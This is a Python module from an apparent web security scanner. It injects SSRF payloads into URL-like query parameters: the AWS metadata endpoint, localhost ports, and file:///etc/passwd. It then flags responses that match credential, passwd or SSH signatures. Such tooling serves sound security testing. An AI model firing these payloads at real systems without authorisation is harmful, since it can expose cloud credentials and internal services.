"""SSRF probing on URL-like parameters."""
from __future__ import annotations

from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from core.http_client import HttpClient
from core.reporter import Finding
from . import evidence

PARAM_HINTS = (
    "url", "uri", "link", "src", "dest", "redirect", "fetch", "load",
    "image", "file", "host", "path", "callback", "webhook",
)

PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/", "metadata"),
    ("http://127.0.0.1:80", "internal"),
    ("http://localhost:22", "internal"),
    ("file:///etc/passwd", "file"),
]

METADATA_SIGNATURES = ("ami-id", "instance-id", "iam/security-credentials", "placement/")
PASSWD_SIGNATURE = "root:x:0:0:"
SSH_SIGNATURE = "SSH-2.0"


def _matches_hint(name: str) -> bool:
    low = name.lower()
    return any(hint in low for hint in PARAM_HINTS)


def _inject(url: str, key: str, payload: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    mutated = {k: v[:] for k, v in params.items()}
    mutated[key] = [payload]
    return urlunparse(parsed._replace(query=urlencode(mutated, doseq=True)))


def _classify(resp, baseline) -> tuple[str, str] | None:
    body = resp.body
    if any(signature in body for signature in METADATA_SIGNATURES):
        return "critical", "AWS metadata terakses"
    if PASSWD_SIGNATURE in body:
        return "high", "file:///etc/passwd terbaca"
    if SSH_SIGNATURE in body:
        return "high", "internal SSH service terakses"
    if baseline and resp.status == 200 and abs(len(body) - len(baseline.body)) > 200:
        return "high", "respons berbeda dari baseline (kemungkinan internal access)"
    return None


async def run(client: HttpClient, pages: list[str]) -> list[Finding]:
    findings: list[Finding] = []
    for page in pages:
        parsed = urlparse(page)
        if not parsed.query:
            continue
        params = parse_qs(parsed.query, keep_blank_values=True)
        keys = [key for key in params if _matches_hint(key)]
        if not keys:
            continue

        baseline = await client.get(page)
        for key in keys:
            for payload, _kind in PAYLOADS:
                probe = _inject(page, key, payload)
                resp = await client.get(probe)
                if not resp:
                    continue
                verdict = _classify(resp, baseline)
                if not verdict:
                    continue
                severity, label = verdict
                findings.append(evidence.from_response(
                    check="ssrf",
                    severity=severity,
                    url=probe,
                    detail=f"SSRF via parameter '{key}': {label}",
                    resp=resp,
                    payload=payload,
                ))
                break

    return findings
